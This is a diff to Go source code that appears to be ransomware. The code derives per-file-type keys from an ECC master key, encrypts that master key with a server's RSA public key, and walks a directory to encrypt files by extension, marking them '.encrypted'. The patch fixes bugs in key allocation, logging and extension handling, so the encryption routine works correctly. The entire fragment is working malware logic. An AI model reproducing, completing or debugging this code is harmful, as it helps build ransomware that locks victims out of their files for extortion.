@@ -43,10 +43,11 @@ func main() {
 
 func generateClientKeys(servPubKey *rsa.PublicKey) ([]*eccLib.ExtendedPublicKey, error) {
 
-	var pubChildKeys []*eccLib.ExtendedPublicKey
 	var i uint16
-	var childsNumber uint16 = uint16(len(utils.FileType))
+	var childsNumber uint16 = utils.FileTypeLenght
 	cMasterKey := eccLib.GenerateMasterPrivKey()
+
+	var pubChildKeys = make([]*eccLib.ExtendedPublicKey, childsNumber)
 
 	masterBytes := eccLib.SerializeExtendedPrivateKey(*cMasterKey)
 	masterBytesEncrypted, err := encryption.RSAAESEncrypt(masterBytes, servPubKey)
@@ -66,7 +67,7 @@ func generateClientKeys(servPubKey *rsa.PublicKey) ([]*eccLib.ExtendedPublicKey,
 	for i = 0; i < childsNumber; i++ {
 		pubChildKeys[i], err = recurDerivPubKey(cMasterKey, i+1, childsNumber, 3)
 		if err != nil {
-			fmt.Printf("Failed to derive child key for index ", i+1)
+			fmt.Println("Failed to derive child key for index ", i+1)
 		}
 	}
 
@@ -118,7 +119,7 @@ func encryptFiles(dirPath string, pubKeys []*eccLib.ExtendedPublicKey) {
 				}
 				ext = filepath.Ext(path)
 				if ext != ".encrypted" {
-					filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
+					filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
 				}
 			}
 			return nil
@@ -131,7 +132,9 @@ func encryptFiles(dirPath string, pubKeys []*eccLib.ExtendedPublicKey) {
 	waitGroup.Add(1)
 	go func() {
 		for file := range filesToVisit {
+
 			fileType, mapContains := utils.FileType[file.Extension]
+
 			if mapContains {
 				err = io.EncryptFile(&file, encryption.ECDHAESEncrypt, &pubKeys[fileType].PublicKey)
 				if err == nil {
